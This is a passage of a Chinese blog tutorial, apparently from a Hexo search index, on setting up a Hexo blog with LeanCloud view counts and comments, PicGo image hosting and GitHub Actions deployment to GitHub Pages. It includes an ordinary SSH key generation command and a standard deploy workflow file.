icons:<br>    - &#123; class: <span class="hljs-string">&quot;iconfont icon-github-fill&quot;</span>, <span class="hljs-built_in">link</span>: <span class="hljs-string">&quot;https://github.com/N1mbus-lock&quot;</span>, tip: <span class="hljs-string">&quot;GitHub&quot;</span> &#125;<br>    - &#123; class: <span class="hljs-string">&quot;iconfont icon-qq-fill&quot;</span>, qrcode: <span class="hljs-string">&quot;/img/qq.png&quot;</span> &#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402161339.png" alt="image"></p><p>关于社交软件的图标，可以在这里面找<a href="https://hexo.fluid-dev.com/docs/icon/">https://hexo.fluid-dev.com/docs/icon/</a></p><p>这些就是一些样式的修改，我放出来的是我自己修改过的地方，如果有更多需求，可以自己去看看代码然后按需修改</p><h3 id="添加浏览量统计"><a href="#添加浏览量统计" class="headerlink" title="添加浏览量统计"></a>添加浏览量统计</h3><p>先去<a href="https://console.leancloud.cn/">LeanCloud</a>里面注册一个账号然后认证一下</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402162723.png" alt="image"></p><p>创建一个应用，选择开发版</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-02%20162750-20250402163127-mg7jggw.png" alt="屏幕截图 2025-04-02 162750"></p><p>在设置里面的操作凭证里面，记录下appid，appkey和rest api服务器地址</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163348.png" alt="image"></p><p>在这把这个改为true</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163524.png" alt="image"></p><p>然后再在这把appid，appkey和rest api服务器地址依次填进去</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163645.png" alt="image"></p><p>这里修改为这样</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402163907.png" alt="image"></p><p>可以看到出现了浏览次数</p><h3 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402164118.png" alt="image"></p><p>先把评论功能开启</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402164208.png" alt="image"></p><p>把之前的appid和appkey填进去就可以了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402164330.png" alt="image"></p><p>评论头像加载不出来，应该是有地方没改到，但是想摆烂，就这样吧，也不是不能接受</p><p>‍</p><p>现在我们的网站已经在本地搭好了，接下来就是部署到github上</p><p>‍</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="PicGo配置"><a href="#PicGo配置" class="headerlink" title="PicGo配置"></a>PicGo配置</h3><p>把思源里面的插件配置好，让它能够把我们的图片放到github仓库里面</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250402165103-6iolp44.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165108.png" alt="image"></p><p>选择github作为图床，然后按如图配置，如果不会生成token，<a href="https://docs.github.com/zh/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens">github生成token</a>（生成不会过期的token，就不用一直换了）</p><p>PicGO就配置好了</p><h3 id="publisher配置"><a href="#publisher配置" class="headerlink" title="publisher配置"></a>publisher配置</h3><p>先把你之前写在本地的文件导入到你存放源码的仓库里面，只需要传如下图的文件就可以了（如果之前没有使用过github，传文件应该会成为一个很大的挑战，<del>因为我就在这被卡住了</del>）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165947.png" alt="image"></p><p>然后进入到思源里面进行配置插件</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165612.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165617.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402165621.png" alt="image"></p><p>导入平台之后点进hexo里面进行配置，配置内容如图</p><h3 id="github-action"><a href="#github-action" class="headerlink" title="github action"></a>github action</h3><p>生成一对ssh公私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t ed25519 -f hexo_deploy_key_nopass -N <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>请使用这个命令生成公私钥，笔者当时在配置时候就因为这个问题找了好久的报错</p><h4 id="为什么要使用这个命令"><a href="#为什么要使用这个命令" class="headerlink" title="为什么要使用这个命令"></a>为什么要使用这个命令</h4><p>因为这个生成公私钥的命令不需要输入密码，而一般生成的公私钥需要输入密码，但是可能是因为我当时使用的那一份脚本没有输入密码，所以一直报权限错误（<del>应该是吧</del>）</p><p>然后进入到github里面你存放源码的那一个仓库里面</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402171956.png" alt="image"></p><p>在setting里面选择<code>secrets and variables</code>​选择<code>Actions</code>​进入到这个界面，创建一个新的<code>secret</code>​</p><p>命名为<code>HEXO_DEPLOY_PRI</code>​（因为那一份脚本里就是这样写的）然后将<code>hexo_deploy_key_nopass</code>​里的所有内容写进去</p><p>然后进入到我们之前创建的那个yourname<a href="https://github.com/N1mbus-lock/N1mbus-lock.github.io">.github.io</a>仓库</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402173308.png" alt="image"></p><p>setting里选择<code>Deploy keys</code>​，然后将<code>hexo_deploy_key_nopass.pub</code>​里的所用东西写进去，命名为<code>HEXO_DEPLOY_PUB</code>​</p><p>现在已经完成了这两个仓库间的通信</p><p>最后，再在存放源码的仓库里面的.github目录下创建一个一个工作流程然后在里面写入我们的配置文件main.yml就成功了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402174114.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402174140.png" alt="image"></p><p>写入</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">name:</span> <span class="hljs-string">HEXO</span> <span class="hljs-string">CI</span><br><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">main</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">strategy:</span><br>      <span class="hljs-attr">matrix:</span><br>        <span class="hljs-attr">node-version:</span> [<span class="hljs-number">20.</span><span class="hljs-string">x</span>]<br><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Use</span> <span class="hljs-string">Node.js</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.node-version</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">matrix.node-version</span> <span class="hljs-string">&#125;&#125;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Configuration</span> <span class="hljs-string">environment</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">HEXO_DEPLOY_PRI:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.HEXO_DEPLOY_PRI</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          mkdir -p ~/.ssh/</span><br><span class="hljs-string">          echo &quot;$HEXO_DEPLOY_PRI&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa</span><br><span class="hljs-string">          chmod 600 ~/.ssh/id_rsa</span><br><span class="hljs-string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span><br><span class="hljs-string">          git config --global user.name &quot;&quot;  #这里写你的github昵称</span><br><span class="hljs-string">          git config --global user.email &quot;&quot; #这里写你的邮箱</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          npm install -g hexo-cli</span><br><span class="hljs-string">          npm install hexo-deployer-git --save</span><br><span class="hljs-string">          npm install</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">hexo</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          hexo clean</span><br><span class="hljs-string">          hexo g</span><br><span class="hljs-string">          hexo d</span><br></code></pre></td></tr></table></figure><p>好啦好啦，终于大功告成了，这样你就会拥有一个属于自己的博客了</p><p>然后使用publisher发布就可以了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402175054.png" alt="image"></p><h2 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h2><h3 id="1-安全性"><a href="#1-安全性" class="headerlink" title="1.安全性"></a>1.安全性</h3><p>我们开始部署的存放blog源码的仓库公开的，好像去年爆出过一个漏洞可以使用一种插件修改别人的github仓库内容，以防别人破环我们的博客。</p><p>解决方案：直接将blog源码仓库改为私人的即可，只要你给publisher中的token权限足够，不会出现通信问题</p><h3 id="2-图片问题"><a href="#2-图片问题" class="headerlink" title="2.图片问题"></a>2.图片问题</h3><p>使用PicGO会将本地图片一直上传至github仓库并替换图片链接，导致在无网络的环境下思源上的图片加载不出来</p><p>解决方案：在我们后来的实践中发现，publisher插件中存在内置的picgo，所以即使关闭picgo插件也能够上传并且不会替换你本地链接，网页上的链接也会是github上的链接（这样的话，好像没有必要picgo这个插件）</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190">GitHub Pages + Hexo搭建个人博客网站，史上最全教程</a></p><p><a href="https://op30132.github.io/2020/02/05/github-action/">Hexo + github actions 自動化部署</a></p><p>和Dre4m师傅一起搭建的，这是她写的文章，如果我写的有什么遗漏的，可以看看她的 <a href="https://dre4m017.github.io/post/free-and-open-source-oneclick-deployment-solution-5yk6g.html">免费开源的一键化部署方案</a></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github pages</tag>
      
      <tag>Hexo</tag>
      
      <tag>思源</tag>
      
      <tag>博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
